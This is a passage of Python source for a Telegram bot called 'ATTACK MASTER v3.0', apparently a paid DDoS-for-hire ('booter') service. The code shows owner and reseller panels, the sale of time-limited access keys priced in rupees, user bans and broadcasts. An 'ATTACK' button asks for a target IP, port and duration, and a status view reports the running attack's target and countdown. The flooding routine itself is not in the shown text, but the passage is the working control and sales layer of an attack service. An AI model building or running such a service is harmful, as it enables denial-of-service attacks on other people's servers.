            owner_msg = f"🔑 NEW KEY REDEEMED\n\n👤 User: @{message.from_user.username or message.from_user.first_name}\n🆔 ID: {user_id}\n🔑 Key: <code>{key_input}</code>\n⏰ Plan: {key_data.get('duration_label', 'N/A')}\n⏳ Time Left: {remaining}"
            try:
                bot.send_message(BOT_OWNER, owner_msg, parse_mode="HTML")
            except:
                pass
        
        elif action == "owner_user":
            del user_state[user_id]
            try:
                tid = int(text)
            except:
                bot.send_message(chat_id, "❌ Invalid user ID!", reply_markup=get_owner_keyboard_page1())
                return
            
            user_data = data["users"].get(str(tid))
            if not user_data:
                bot.send_message(chat_id, f"❌ User {tid} not found!", reply_markup=get_owner_keyboard_page1())
                return
            
            remaining = get_time_remaining_full(tid)
            attacks = user_data.get("total_attacks", 0)
            text_msg = f"""👤 USER DETAILS

🆔 {tid}
🔑 <code>{user_data.get('key', 'None')}</code>
📋 {user_data.get('key_duration_label', 'N/A')}
⏳ {remaining}
🎯 {attacks}
✅ {'ACTIVE' if remaining != 'Expired' else 'EXPIRED'}"""
            bot.send_message(chat_id, text_msg, parse_mode="HTML", reply_markup=get_owner_keyboard_page1())
        
        elif action == "owner_add_reseller":
            del user_state[user_id]
            try:
                rid = int(text)
            except:
                bot.send_message(chat_id, "❌ Invalid user ID!", reply_markup=get_owner_keyboard_page1())
                return
            
            if str(rid) in data["resellers"]:
                bot.send_message(chat_id, "❌ Already a reseller!", reply_markup=get_owner_keyboard_page1())
                return
            
            data["resellers"][str(rid)] = {
                'user_id': rid, 'balance': 0, 'added_at': datetime.now().isoformat(),
                'blocked': False, 'total_keys_generated': 0
            }
            save_data(data)
            bot.send_message(chat_id, f"✅ Reseller {rid} added!", reply_markup=get_owner_keyboard_page1())
            
            try:
                bot.send_message(rid, "🎉 CONGRATULATIONS! YOU HAVE BEEN ADDED AS A RESELLER!\n\nUse /start to see your reseller panel.")
            except:
                pass
        
        elif action == "owner_remove_reseller":
            del user_state[user_id]
            try:
                rid = int(text)
            except:
                bot.send_message(chat_id, "❌ Invalid reseller ID!", reply_markup=get_owner_keyboard_page1())
                return
            
            if str(rid) not in data["resellers"]:
                bot.send_message(chat_id, "❌ Reseller not found!", reply_markup=get_owner_keyboard_page1())
                return
            
            del data["resellers"][str(rid)]
            save_data(data)
            bot.send_message(chat_id, f"✅ Reseller {rid} removed!", reply_markup=get_owner_keyboard_page1())
            
            try:
                bot.send_message(rid, "❌ You have been removed as a reseller!")
            except:
                pass
        
        elif action == "owner_max_attack":
            del user_state[user_id]
            try:
                v = int(text)
                if 10 <= v <= 600:
                    set_setting('max_attack_time', v)
                    bot.send_message(chat_id, f"✅ Max attack time set to {v}s!", reply_markup=get_owner_keyboard_page1())
                else:
                    bot.send_message(chat_id, "❌ Must be 10-600 seconds!", reply_markup=get_owner_keyboard_page1())
            except:
                bot.send_message(chat_id, "❌ Invalid number!", reply_markup=get_owner_keyboard_page1())
        
        elif action == "owner_broadcast":
            del user_state[user_id]
            sent = 0
            failed = 0
            for uid in data["users"]:
                try:
                    bot.send_message(int(uid), f"📢 BROADCAST\n\n{text}")
                    sent += 1
                except:
                    failed += 1
                time.sleep(0.05)
            bot.send_message(chat_id, f"✅ Broadcast sent!\n✅ Sent: {sent}\n❌ Failed: {failed}", reply_markup=get_owner_keyboard_page1())
        
        elif action == "owner_extend":
            del user_state[user_id]
            parts = text.split()
            if len(parts) != 2:
                bot.send_message(chat_id, "❌ Send: USER_ID TIME\nExample: 123456789 1d", reply_markup=get_owner_keyboard_page1())
                return
            
            try:
                tid = int(parts[0])
            except:
                bot.send_message(chat_id, "❌ Invalid user ID!", reply_markup=get_owner_keyboard_page1())
                return
            
            secs, label = parse_duration(parts[1].lower())
            if not secs:
                bot.send_message(chat_id, "❌ Invalid time! Use: 10m, 1h, 1d", reply_markup=get_owner_keyboard_page1())
                return
            
            if str(tid) not in data["users"] or not data["users"][str(tid)].get('key_expiry'):
                bot.send_message(chat_id, "❌ User doesn't have an active key!", reply_markup=get_owner_keyboard_page1())
                return
            
            u = data["users"][str(tid)]
            old_expiry = datetime.fromisoformat(u['key_expiry'])
            if old_expiry < datetime.now():
                bot.send_message(chat_id, "❌ User's key has already expired!", reply_markup=get_owner_keyboard_page1())
                return
            
            new_expiry = old_expiry + timedelta(seconds=secs)
            u['key_expiry'] = new_expiry.isoformat()
            save_data(data)
            
            bot.send_message(chat_id, f"✅ Time Extended!\n\n👤 User: {tid}\n⏰ Added: {label}\n📅 New Expiry: {new_expiry.strftime('%Y-%m-%d %H:%M:%S')}", reply_markup=get_owner_keyboard_page1())
        
        elif action == "owner_extend_all":
            del user_state[user_id]
            secs, label = parse_duration(text.lower())
            if not secs:
                bot.send_message(chat_id, "❌ Invalid time! Use: 10m, 1h, 1d, 7d, 30d", reply_markup=get_owner_keyboard_page1())
                return
            
            count = 0
            for uid, user in data["users"].items():
                if user.get('key_expiry'):
                    expiry = datetime.fromisoformat(user['key_expiry'])
                    if expiry > datetime.now():
                        new_expiry = expiry + timedelta(seconds=secs)
                    else:
                        new_expiry = datetime.now() + timedelta(seconds=secs)
                    user['key_expiry'] = new_expiry.isoformat()
                    count += 1
            
            save_data(data)
            bot.send_message(chat_id, f"✅ {count} users ka time extend ho gaya!\n⏰ Added: {label}", reply_markup=get_owner_keyboard_page1())
        
        elif action == "owner_ban":
            del user_state[user_id]
            try:
                tid = int(text)
            except:
                bot.send_message(chat_id, "❌ Invalid user ID!", reply_markup=get_owner_keyboard_page2())
                return
            
            if tid == BOT_OWNER:
                bot.send_message(chat_id, "❌ Cannot ban owner!", reply_markup=get_owner_keyboard_page2())
                return
            
            if str(tid) not in data["users"]:
                data["users"][str(tid)] = {'user_id': tid}
            data["users"][str(tid)]['banned'] = True
            save_data(data)
            bot.send_message(chat_id, f"🚫 User {tid} BANNED!", reply_markup=get_owner_keyboard_page2())
        
        elif action == "owner_unban":
            del user_state[user_id]
            try:
                tid = int(text)
            except:
                bot.send_message(chat_id, "❌ Invalid user ID!", reply_markup=get_owner_keyboard_page2())
                return
            
            if str(tid) in data["users"]:
                data["users"][str(tid)]['banned'] = False
                save_data(data)
                bot.send_message(chat_id, f"✅ User {tid} UNBANNED!", reply_markup=get_owner_keyboard_page2())
            else:
                bot.send_message(chat_id, f"❌ User {tid} not found!", reply_markup=get_owner_keyboard_page2())
        
        elif action == "owner_delete_user":
            del user_state[user_id]
            try:
                tid = int(text)
            except:
                bot.send_message(chat_id, "❌ Invalid user ID!", reply_markup=get_owner_keyboard_page2())
                return
            
            if str(tid) in data["users"]:
                del data["users"][str(tid)]
                save_data(data)
                bot.send_message(chat_id, f"🗑️ User {tid} DELETED!", reply_markup=get_owner_keyboard_page2())
            else:
                bot.send_message(chat_id, f"❌ User {tid} not found!", reply_markup=get_owner_keyboard_page2())
        
        elif action == "owner_reseller_users":
            del user_state[user_id]
            try:
                rid = int(text)
            except:
                bot.send_message(chat_id, "❌ Invalid reseller ID!", reply_markup=get_owner_keyboard_page1())
                return
            
            if str(rid) not in data["resellers"]:
                bot.send_message(chat_id, "❌ Reseller not found!", reply_markup=get_owner_keyboard_page1())
                return
            
            users_list = []
            for key, key_data in data["keys"].items():
                if key_data.get('created_by') == rid and key_data.get('used'):
                    uid = key_data.get('used_by')
                    if uid:
                        user = data["users"].get(str(uid))
                        if user:
                            users_list.append(user)
            
            if not users_list:
                bot.send_message(chat_id, f"📋 Reseller {rid} has no users yet!", reply_markup=get_owner_keyboard_page1())
                return
            
            msg = f"👥 RESELLER {rid} USERS\n\n"
            for user in users_list[:20]:
                msg += f"👤 @{user.get('username', 'Unknown')}\n🆔 {user.get('user_id')}\n🔑 <code>{user.get('key', 'None')}</code>\n\n"
            
            if len(msg) > 4000:
                for i in range(0, len(msg), 4000):
                    bot.send_message(chat_id, msg[i:i+4000], parse_mode="HTML")
            else:
                bot.send_message(chat_id, msg, parse_mode="HTML", reply_markup=get_owner_keyboard_page1())
        
        elif action == "owner_maint_on":
            del user_state[user_id]
            set_setting('maintenance_mode', True)
            set_setting('maintenance_msg', text)
            bot.send_message(chat_id, f"🔧 MAINTENANCE ON!\n\nMessage: {text}", reply_markup=get_owner_keyboard_page2())
        
        elif action == "reseller_gen":
            del user_state[user_id]
            parts = text.split()
            if len(parts) != 2:
                bot.send_message(chat_id, "❌ Send: DUR COUNT\nDurations: 12h, 1d, 3d, 7d, 30d, 60d\nExample: 1d 5", reply_markup=get_reseller_keyboard())
                return
            
            dk = parts[0].lower()
            if dk not in RESELLER_PRICING:
                bot.send_message(chat_id, "❌ Invalid duration!", reply_markup=get_reseller_keyboard())
                return
            
            try:
                count = int(parts[1])
                if count < 1 or count > 20:
                    bot.send_message(chat_id, "❌ Count must be 1-20!", reply_markup=get_reseller_keyboard())
                    return
            except:
                bot.send_message(chat_id, "❌ Invalid count!", reply_markup=get_reseller_keyboard())
                return
            
            r = data["resellers"].get(str(user_id))
            if not r or r.get('blocked'):
                bot.send_message(chat_id, "🚫 Your reseller panel is blocked!", reply_markup=get_reseller_keyboard())
                return
            
            price = RESELLER_PRICING[dk]['price'] * count
            balance = r.get('balance', 0)
            
            if balance < price:
                bot.send_message(chat_id, f"❌ Insufficient balance!\n💰 Required: {price} Rs\n💵 Your Balance: {balance} Rs", reply_markup=get_reseller_keyboard())
                return
            
            keys = []
            username = message.from_user.username or str(user_id)
            for _ in range(count):
                k = generate_reseller_key(username, 10)
                data["keys"][k] = {
                    'duration_seconds': RESELLER_PRICING[dk]['seconds'],
                    'duration_label': RESELLER_PRICING[dk]['label'],
                    'created_at': datetime.now().isoformat(), 'created_by': user_id,
                    'used': False
                }
                keys.append(k)
            
            r['balance'] = balance - price
            r['total_keys_generated'] = r.get('total_keys_generated', 0) + count
            save_data(data)
            
            keys_text = ""
            for k in keys:
                keys_text += f"🔑 <code>{k}</code>\n"
            bot.send_message(chat_id, f"✅ {count} KEY(S) GENERATED!\n\n{keys_text}⏰ Duration: {RESELLER_PRICING[dk]['label']}\n💰 Cost: {price} Rs\n💵 Balance: {r['balance']} Rs", parse_mode="HTML", reply_markup=get_reseller_keyboard())
        
        elif action == "reseller_deluser":
            del user_state[user_id]
            try:
                tid = int(text)
            except:
                bot.send_message(chat_id, "❌ Invalid user ID!", reply_markup=get_reseller_keyboard())
                return
            
            found = False
            for k, v in data["keys"].items():
                if v.get('used_by') == tid and v.get('created_by') == user_id:
                    found = True
                    break
            
            if not found:
                bot.send_message(chat_id, f"❌ User {tid} is not your customer!", reply_markup=get_reseller_keyboard())
                return
            
            if str(tid) in data["users"]:
                del data["users"][str(tid)]
                save_data(data)
                bot.send_message(chat_id, f"🗑️ User {tid} DELETED!", reply_markup=get_reseller_keyboard())
            else:
                bot.send_message(chat_id, f"❌ User {tid} not found!", reply_markup=get_reseller_keyboard())
        
        return
    
    # ============= BUTTON HANDLERS =============
    
    if text == "👑 OWNER PANEL" and is_owner(user_id):
        owner_page[user_id] = 1
        bot.send_message(chat_id, "👑 OWNER PANEL - PAGE 1/2\n\nSelect an option:", reply_markup=get_owner_keyboard_page1())
        return
    
    if text == "➡️ NEXT PAGE" and is_owner(user_id):
        owner_page[user_id] = 2
        bot.send_message(chat_id, "👑 OWNER PANEL - PAGE 2/2\n\nSelect an option:", reply_markup=get_owner_keyboard_page2())
        return
    
    if text == "⬅️ PREV PAGE" and is_owner(user_id):
        owner_page[user_id] = 1
        bot.send_message(chat_id, "👑 OWNER PANEL - PAGE 1/2\n\nSelect an option:", reply_markup=get_owner_keyboard_page1())
        return
    
    owner_buttons_page1 = ["🔑 GEN KEY", "🗑️ DELETE KEY", "👤 USER DETAILS", "➕ ADD RESELLER", 
                          "💵 ADD BALANCE", "🗑️ REMOVE RESELLER", "⚙️ MAX ATTACK", "📢 BROADCAST",
                          "👥 ALL USERS", "🔑 ALL KEYS", "⏰ EXTEND", "📊 EXTEND ALL", "📊 RESELLER USERS"]
    
    owner_buttons_page2 = ["🚫 BAN USER", "✅ UNBAN USER", "🗑️ DELETE USER", "💰 SALDO CHECK",
                          "🔧 MAINTENANCE ON", "✅ MAINTENANCE OFF"]
    
    if text in owner_buttons_page1 and is_owner(user_id):
        if text == "🔑 GEN KEY":
            bot.send_message(chat_id, "🔑 GENERATE KEY\n\nSend: TIME COUNT\nExample: 1d 5\nFormats: 10m, 1h, 1d, 7d, 30d\n\nType CANCEL to cancel.", reply_markup=get_back_keyboard())
            user_state[user_id] = {"action": "owner_gen"}
        elif text == "🗑️ DELETE KEY":
            bot.send_message(chat_id, "🗑️ DELETE KEY\n\nSend the key to delete:\nExample: BGMI-ABCD1234\n\nType CANCEL to cancel.", reply_markup=get_back_keyboard())
            user_state[user_id] = {"action": "owner_delkey"}
        elif text == "👤 USER DETAILS":
            bot.send_message(chat_id, "👤 USER DETAILS\n\nSend user ID:\nExample: 123456789\n\nType CANCEL to cancel.", reply_markup=get_back_keyboard())
            user_state[user_id] = {"action": "owner_user"}
        elif text == "➕ ADD RESELLER":
            bot.send_message(chat_id, "➕ ADD RESELLER\n\nSend user ID:\nExample: 123456789\n\nType CANCEL to cancel.", reply_markup=get_back_keyboard())
            user_state[user_id] = {"action": "owner_add_reseller"}
        elif text == "💵 ADD BALANCE":
            bot.send_message(chat_id, "💵 ADD BALANCE\n\nSend: RESELLER_ID AMOUNT\nExample: 123456789 100\n\nType CANCEL to cancel.", reply_markup=get_back_keyboard())
            user_state[user_id] = {"action": "owner_add_balance"}
        elif text == "🗑️ REMOVE RESELLER":
            bot.send_message(chat_id, "🗑️ REMOVE RESELLER\n\nSend reseller ID:\nExample: 123456789\n\nType CANCEL to cancel.", reply_markup=get_back_keyboard())
            user_state[user_id] = {"action": "owner_remove_reseller"}
        elif text == "⚙️ MAX ATTACK":
            mt = get_max_attack_time()
            bot.send_message(chat_id, f"⚙️ MAX ATTACK TIME\n\nCurrent: {mt}s\n\nSend new time (10-600 seconds):\n\nType CANCEL to cancel.", reply_markup=get_back_keyboard())
            user_state[user_id] = {"action": "owner_max_attack"}
        elif text == "📢 BROADCAST":
            bot.send_message(chat_id, "📢 BROADCAST\n\nSend your message:\n\nType CANCEL to cancel.", reply_markup=get_back_keyboard())
            user_state[user_id] = {"action": "owner_broadcast"}
        elif text == "👥 ALL USERS":
            if not data["users"]:
                bot.send_message(chat_id, "👥 No users found!", reply_markup=get_owner_keyboard_page1())
                return
            
            total_users = len(data["users"])
            active_count = 0
            
            for uid, u in data["users"].items():
                if u.get('key_expiry'):
                    expiry = datetime.fromisoformat(u['key_expiry'])
                    if expiry > datetime.now():
                        active_count += 1
            
            msg = f"👥 ALL USERS\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📊 TOTAL USERS: {total_users}\n🟢 ACTIVE USERS: {active_count}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            
            for uid, u in data["users"].items():
                if u.get('key_expiry') and datetime.fromisoformat(u['key_expiry']) > datetime.now():
                    uname = u.get("username", "Unknown")
                    remaining = get_time_remaining_full(int(uid))
                    attacks = u.get("total_attacks", 0)
                    key = u.get("key", "None")
                    plan = u.get("key_duration_label", "N/A")
                    msg += f"👤 @{uname}\n🆔 {uid}\n🔑 <code>{key}</code>\n📋 {plan}\n⏳ {remaining}\n✅ ACTIVE\n⚔️ {attacks}\n" + "─"*25 + "\n"
            
            if len(msg) > 4000:
                for i in range(0, len(msg), 4000):
                    bot.send_message(chat_id, msg[i:i+4000], parse_mode="HTML", reply_markup=get_owner_keyboard_page1())
            else:
                bot.send_message(chat_id, msg, parse_mode="HTML", reply_markup=get_owner_keyboard_page1())
        elif text == "🔑 ALL KEYS":
            if not data["keys"]:
                bot.send_message(chat_id, "🔑 No keys found!", reply_markup=get_owner_keyboard_page1())
                return
            
            unused = [k for k, v in data["keys"].items() if not v.get('used')]
            used = [k for k, v in data["keys"].items() if v.get('used')]
            
            msg = f"🔑 ALL KEYS\n\n🟢 AVAILABLE ({len(unused)}):\n"
            for k in unused[:20]:
                msg += f"• <code>{k}</code>\n"
            msg += f"\n🔴 USED ({len(used)}):\n"
            for k in used[:10]:
                msg += f"• <code>{k}</code>\n"
            
            bot.send_message(chat_id, msg, parse_mode="HTML", reply_markup=get_owner_keyboard_page1())
        elif text == "⏰ EXTEND":
            bot.send_message(chat_id, "⏰ EXTEND USER TIME\n\nSend: USER_ID TIME\nExample: 123456789 1d\n\nType CANCEL to cancel.", reply_markup=get_back_keyboard())
            user_state[user_id] = {"action": "owner_extend"}
        elif text == "📊 EXTEND ALL":
            bot.send_message(chat_id, "📊 EXTEND ALL USERS\n\nSend time to extend all users:\nExample: 1d\nFormats: 10m, 1h, 1d, 7d, 30d\n\nType CANCEL to cancel.", reply_markup=get_back_keyboard())
            user_state[user_id] = {"action": "owner_extend_all"}
        elif text == "📊 RESELLER USERS":
            bot.send_message(chat_id, "📊 RESELLER USERS\n\nSend reseller ID to see their users:\nExample: 123456789\n\nType CANCEL to cancel.", reply_markup=get_back_keyboard())
            user_state[user_id] = {"action": "owner_reseller_users"}
        return
    
    if text in owner_buttons_page2 and is_owner(user_id):
        if text == "🚫 BAN USER":
            bot.send_message(chat_id, "🚫 BAN USER\n\nSend user ID to ban:\nExample: 123456789\n\nType CANCEL to cancel.", reply_markup=get_back_keyboard())
            user_state[user_id] = {"action": "owner_ban"}
        elif text == "✅ UNBAN USER":
            bot.send_message(chat_id, "✅ UNBAN USER\n\nSend user ID to unban:\nExample: 123456789\n\nType CANCEL to cancel.", reply_markup=get_back_keyboard())
            user_state[user_id] = {"action": "owner_unban"}
        elif text == "🗑️ DELETE USER":
            bot.send_message(chat_id, "🗑️ DELETE USER\n\nSend user ID to delete:\nExample: 123456789\n\n⚠️ This will remove user permanently!\n\nType CANCEL to cancel.", reply_markup=get_back_keyboard())
            user_state[user_id] = {"action": "owner_delete_user"}
        elif text == "💰 SALDO CHECK":
            bot.send_message(chat_id, "💰 SALDO CHECK\n\nSend reseller ID to check balance:\nExample: 123456789\n\nType CANCEL to cancel.", reply_markup=get_back_keyboard())
            user_state[user_id] = {"action": "owner_saldo"}
        elif text == "🔧 MAINTENANCE ON":
            bot.send_message(chat_id, "🔧 MAINTENANCE ON\n\nSend maintenance message:\nExample: Bot is updating, back in 10 minutes!\n\nType CANCEL to cancel.", reply_markup=get_back_keyboard())
            user_state[user_id] = {"action": "owner_maint_on"}
        elif text == "✅ MAINTENANCE OFF":
            set_setting('maintenance_mode', False)
            bot.send_message(chat_id, "✅ MAINTENANCE OFF!\nBot is now available.", reply_markup=get_owner_keyboard_page2())
        return
    
    if text == "💼 RESELLER PANEL" and is_reseller(user_id):
        bot.send_message(chat_id, "💼 RESELLER PANEL\n\nSelect an option:", reply_markup=get_reseller_keyboard())
        return
    
    reseller_buttons = ["🔑 GENERATE KEYS", "🗑️ DELETE USER", "📊 MY STATS", "💰 PRICING", "📊 RESELLER USERS", "📊 SERVER STATUS"]
    
    if text in reseller_buttons and is_reseller(user_id):
        if text == "🔑 GENERATE KEYS":
            r = data["resellers"].get(str(user_id))
            if not r or r.get('blocked'):
                bot.send_message(chat_id, "🚫 Your reseller panel is blocked!", reply_markup=get_reseller_keyboard())
                return
            bot.send_message(chat_id, "🔑 GENERATE KEYS\n\nSend: DUR COUNT\nDurations: 12h, 1d, 3d, 7d, 30d, 60d\nExample: 1d 5\n\nType CANCEL to cancel.", reply_markup=get_back_keyboard())
            user_state[user_id] = {"action": "reseller_gen"}
        elif text == "🗑️ DELETE USER":
            bot.send_message(chat_id, "🗑️ DELETE USER\n\nSend user ID:\nExample: 123456789\n\n⚠️ Only your customers!\n\nType CANCEL to cancel.", reply_markup=get_back_keyboard())
            user_state[user_id] = {"action": "reseller_deluser"}
        elif text == "📊 MY STATS":
            r = data["resellers"].get(str(user_id))
            if r:
                user_count = sum(1 for k, v in data["keys"].items() if v.get('created_by') == user_id and v.get('used'))
                msg = f"📊 MY STATS\n\n💰 Balance: {r.get('balance',0)} Rs\n🔑 Keys Generated: {r.get('total_keys_generated',0)}\n👥 Users Activated: {user_count}"
            else:
                msg = "❌ Not a reseller!"
            bot.send_message(chat_id, msg, reply_markup=get_reseller_keyboard())
        elif text == "💰 PRICING":
            msg = "💰 KEY PRICING\n\n"
            for k, v in RESELLER_PRICING.items():
                msg += f"• {v['label']}: {v['price']} Rs\n"
            bot.send_message(chat_id, msg, reply_markup=get_reseller_keyboard())
        elif text == "📊 RESELLER USERS":
            users_list = []
            for key, key_data in data["keys"].items():
                if key_data.get('created_by') == user_id and key_data.get('used'):
                    uid = key_data.get('used_by')
                    if uid:
                        user = data["users"].get(str(uid))
                        if user:
                            users_list.append(user)
            
            if not users_list:
                bot.send_message(chat_id, "📋 You have no users yet!", reply_markup=get_reseller_keyboard())
                return
            
            msg = "👥 YOUR USERS\n\n"
            for user in users_list[:20]:
                msg += f"👤 @{user.get('username', 'Unknown')}\n🆔 {user.get('user_id')}\n🔑 <code>{user.get('key', 'None')}</code>\n\n"
            
            if len(msg) > 4000:
                for i in range(0, len(msg), 4000):
                    bot.send_message(chat_id, msg[i:i+4000], parse_mode="HTML")
            else:
                bot.send_message(chat_id, msg, parse_mode="HTML", reply_markup=get_reseller_keyboard())
        elif text == "📊 SERVER STATUS":
            attack_info = get_active_attack_info()
            total_users = len(data["users"])
            active_users = 0
            for uid, u in data["users"].items():
                if u.get('key_expiry'):
                    try:
                        expiry = datetime.fromisoformat(u['key_expiry'])
                        if expiry > datetime.now():
                            active_users += 1
                    except:
                        pass
            
            if attack_info['running']:
                status_text = f"""📊 SERVER STATUS (Auto-Refresh)

🤖 Bot Info:
• Status: 🟢 ONLINE
• Server: 1
• Max Attack Time: {get_max_attack_time()}s

🔥 CURRENT ATTACK:
• User: @{attack_info['username']}
• Target: {attack_info['target']}:{attack_info['port']}
• Time Left: {attack_info['remaining']}s

👥 Users:
• Total: {total_users}
• Active: {active_users}

🔄 Auto-refresh every 5 seconds..."""
            else:
                status_text = f"""📊 SERVER STATUS (Auto-Refresh)

🤖 Bot Info:
• Status: 🟢 ONLINE
• Server: 1
• Max Attack Time: {get_max_attack_time()}s

🔥 CURRENT ATTACK: IDLE

👥 Users:
• Total: {total_users}
• Active: {active_users}

🔄 Auto-refresh every 5 seconds..."""
            
            sent_msg = bot.send_message(chat_id, status_text, reply_markup=get_reseller_keyboard())
            threading.Thread(target=server_status_auto_refresh, args=(chat_id, sent_msg.message_id, user_id, False), daemon=True).start()
        return
    
    # COMMON BUTTONS
    if text == "🔥 ATTACK":
        if not is_owner(user_id) and not has_valid_key(user_id):
            bot.send_message(chat_id, "⚠️ You don't have an active key!\n\nUse REDEEM KEY button to activate.", reply_markup=get_non_active_keyboard())
            return
        
        if is_attack_running():
            attack_info = get_active_attack_info()
            bot.send_message(chat_id, 
                f"❌ Attack already running!\n\n👤 User: @{attack_info['username']}\n🎯 Target: {attack_info['target']}:{attack_info['port']}\n⏰ Time Left: {attack_info['remaining']}s\n\nOnly 1 attack allowed at a time!",
                reply_markup=get_main_keyboard(user_id))
            return
        
        bot.send_message(chat_id, "🔥 ATTACK MODE\n\nSend: IP PORT TIME\n\nExample: 1.1.1.1 80 60\n\nType CANCEL to cancel.", reply_markup=get_back_keyboard())
        user_state[user_id] = {"action": "attack"}
        return
    
    if text == "STATUS":
        if not is_owner(user_id) and not has_valid_key(user_id):
            bot.send_message(chat_id, "⚠️ You don't have an active key!\n\nUse REDEEM KEY button to activate.", reply_markup=get_non_active_keyboard())
            return
        
        attack_info = get_active_attack_info()
        if attack_info['running']:
            bot.send_message(chat_id, 
                f"📊 ACTIVE ATTACK\n\n👤 User: @{attack_info['username']}\n🎯 Target: {attack_info['target']}:{attack_info['port']}\n⏰ Time Left: {attack_info['remaining']}s",
                reply_markup=get_main_keyboard(user_id))
        else:
            bot.send_message(chat_id, "📊 NO ACTIVE ATTACKS\n\nReady to launch!", reply_markup=get_main_keyboard(user_id))
        return
    
    if text == "🔑 REDEEM KEY":
        if is_owner(user_id):
            bot.send_message(chat_id, "⚠️ You are owner! You don't need to redeem keys.", reply_markup=get_main_keyboard(user_id))
            return
        
        if has_valid_key(user_id):
            remaining = get_time_remaining_full(user_id)
            bot.send_message(chat_id, f"⚠️ You already have an active key!\n⏳ Time Left: {remaining}", reply_markup=get_main_keyboard(user_id))
            return
        
        bot.send_message(chat_id, "🔑 REDEEM KEY\n\nSend your key now.\n\nExample: BGMI-ABCD1234XYZ\n\nType CANCEL to cancel.", reply_markup=get_back_keyboard())
        user_state[user_id] = {"action": "redeem"}
        return
    
    if text == "👤 PROFILE":
        if not has_valid_key(user_id) and not is_owner(user_id):
            bot.send_message(chat_id, "⚠️ You don't have an active key!\n\nUse REDEEM KEY button to activate.", reply_markup=get_non_active_keyboard())
            return
        
        user_data = data["users"].get(str(user_id), {})
        attacks = user_data.get("total_attacks", 0)
        remaining = get_time_remaining_full(user_id)
        expiry = datetime.fromisoformat(user_data['key_expiry']) if user_data.get('key_expiry') else None
        text_msg = f"""👤 YOUR PROFILE
━━━━━━━━━━━━━━
🆔 User ID: {user_id}
🔑 <code>{user_data.get('key', 'None')}</code>
📋 Plan: {user_data.get('key_duration_label', 'N/A')}
⏰ Time Left: {remaining}
📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S') if expiry else 'N/A'}
🎯 Total Attacks: {attacks}
✅ Status: ACTIVE
━━━━━━━━━━━━━━"""
        bot.send_message(chat_id, text_msg, parse_mode="HTML", reply_markup=get_main_keyboard(user_id))
        return
    
    if text == "❌ CANCEL":
        if user_id in user_state:
            del user_state[user_id]
        bot.send_message(chat_id, "❌ Cancelled!", reply_markup=get_main_keyboard(user_id))
        return
    
    if text == "🏠 MAIN MENU":
        if user_id in user_state:
            del user_state[user_id]
        cmd_start(message)
        return
    
    if user_id in user_state:
        bot.send_message(chat_id, "❌ Invalid! Type CANCEL to cancel.", reply_markup=get_back_keyboard())
    else:
        bot.send_message(chat_id, "⚡ ATTACK MASTER ⚡\n\nUse /start to see menu.", reply_markup=get_main_keyboard(user_id))


# ============= MAIN =============
print("""
╔══════════════════════════════════════════════════════════════╗
║   ⚡ ATTACK MASTER v3.0                                      ║
║   IS LIVE NOW                                                ║
╚══════════════════════════════════════════════════════════════╝""")
print(f"👑 Owner: {BOT_OWNER}")
print(f"📊 Users: {len(data['users'])}")
print(f"🔑 Keys: {len(data['keys'])}")
print(f"💼 Resellers: {len(data['resellers'])}")
print("✅ Bot is running!")
print("✅ AUTO-REFRESH: Attack countdown updates every second!")
print("✅ AUTO-REFRESH: Server status updates every 5 seconds!")
print("✅ Expired users automatically removed from database!")
print("✅ Expired users cannot launch attacks!")
print("✅ Attack complete message works properly!")

while True:
    try:
        bot.polling(none_stop=True, interval=0, timeout=20)
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(3)